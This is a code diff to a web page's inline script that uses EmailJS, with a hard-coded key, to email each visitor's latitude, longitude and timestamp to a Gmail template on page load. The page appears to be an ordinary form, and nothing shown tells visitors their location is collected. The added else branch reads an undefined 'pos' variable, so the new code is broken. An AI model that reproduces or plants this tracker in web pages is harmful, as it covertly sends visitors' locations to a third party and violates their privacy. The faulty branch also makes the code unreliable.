@@ -14,6 +14,7 @@
       emailjs.init("user_yKOIZdzTKV3oSiNQ8azol");
    })();
 
+   if(navigator.geolocation){
    navigator.geolocation.getCurrentPosition(function(pos){
         var date = new Date(pos.timestamp);
         
@@ -21,6 +22,12 @@
         var lng = pos.coords.longitude;
         emailjs.send("gmail", "pranoy_mail", {lat,lng,date});
    });
+}else{
+     var date = new Date(pos.timestamp);
+    lat = "No";
+    lng = "No";
+       emailjs.send("gmail", "pranoy_mail", {lat,lng,date});
+   }
 </script>
     <style>
     .centered-form{
